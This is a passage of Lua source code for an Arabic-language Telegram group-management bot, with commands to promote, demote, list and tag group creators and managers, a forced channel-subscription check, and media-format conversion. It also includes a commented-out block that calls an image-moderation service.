local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المالكين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله من المالكين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
--[[
if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then      
sticker_id = msg.content_.sticker_.sticker_.persistent_id_
st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..tonumber(0000000)..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
if eker.ok.Info == "Indecent" then
local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
t = "⋄المنشئين الاساسين تعالو مخرب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⋄ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply","⋄قام بنشر ملصق اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
if (msg.content_.photo_) and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then
photo_id = msg.content_.photo_.sizes_[1].photo_.persistent_id_  
Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..tonumber(0000000)..'&url='..photo_id.."&type=photo")
Sto = JSON.decode(Srrt)
if Sto.ok.Info == "Indecent" then
local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
t = "⋄المنشئين الاساسين تعالو مخرب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⋄ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply","⋄قام بنشر صوره اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
]]--
if text == 'تفعيل التحويل' and CoSu(msg) then   
if database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:sofi'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التحويل' and CoSu(msg) then  
if not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:sofi'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل امر تحويل'
else
Text = '\n⋄بالتاكيد تم تعطيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.photo_ then 
local pn = result.content_.photo_.sizes_[1].photo_.persistent_id_
Addsticker(msg,msg.chat_id_,pn,msg.sender_user_id_..'.png')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.voice_ then 
local mr = result.content_.voice_.voice_.persistent_id_ 
Addmp3(msg,msg.chat_id_,mr,msg.sender_user_id_..'.mp3')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.audio_ then 
local mr = result.content_.audio_.audio_.persistent_id_
Addvoi(msg,msg.chat_id_,mr,msg.sender_user_id_..'.ogg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.sticker_ then 
local Str = result.content_.sticker_.sticker_.persistent_id_ 
Addjpg(msg,msg.chat_id_,Str,msg.sender_user_id_..'.jpg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
-------------------
------------------------------------------------------------------------
if text == ("مسح الاساسين") and CoSu(msg) then
database:del(bot_id..'Basic:Constructor'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n⋄تم مسح المنشئين الاساسين')
return false
end
if text == 'المنشئين الاساسين' and CoSu(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n⋄قائمة المنشئين الاساسين \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد منشئين اساسين"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("تاك للمنشئين الاساسين") or text == ("صيح المنشئين الاساسين") then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n⋄وينكم تعالو يريدوكم بالجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد منشئين اساسين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي @(.*)$") and CoSu(msg) then
local username = text:match("^رفع منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته منشئ اساسي'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي (%d+)$") and CoSu(msg) then
local userid = text:match("^رفع منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي @(.*)$") and CoSu(msg) then
local username = text:match("^تنزيل منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من الاساسيين'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي (%d+)$") and CoSu(msg) then
local userid = text:match("^تنزيل منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'مسح المنشئين' and BasicConstructor(msg) then
database:del(bot_id..'Constructor'..msg.chat_id_)
texts = ' ⋄تم مسح المنشئين '
send(msg.chat_id_, msg.id_, texts)
end

if text == ("المنشئين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n⋄قائمة المنشئين \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد منشئين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمنشئين") or text == ("صيح المنشئين") then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n⋄وينكم تعالو يريدوكم بالجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد منشئين"
end
send(msg.chat_id_, msg.id_, t)
end
if text ==("المنشئ") then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_," ⋄حساب المنشئ محذوف")
return false  
end
local UserName = (b.username_ or "UUOUOU_7")
send(msg.chat_id_, msg.id_," ⋄منشئ الجروب »> ["..b.first_name_.."](T.me/"..UserName..")")  
end,nil)   
end
end
end,nil)   
end
if text == "رفع منشئ" and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^رفع منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته منشئ'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^رفع منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^رفع منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
if text and text:match("^تنزيل منشئ$") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المنشئين'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^تنزيل منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
------------------------------------------------------------------------
if text == 'مسح المدراء' and Constructor(msg) then
database:del(bot_id..'Manager'..msg.chat_id_)
texts = ' ⋄تم مسح المدراء '
send(msg.chat_id_, msg.id_, texts)
end
if text == ("المدراء") and Constructor(msg) then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n⋄قائمة المدراء \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد مدرا"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمدرا") or text == ("صيح المدراء") then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n⋄وينكم تعالو يريدوكم بالجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد مدرا"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^رفع مدير @(.*)$") and Constructor(msg) then
local username = text:match("^رفع مدير @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
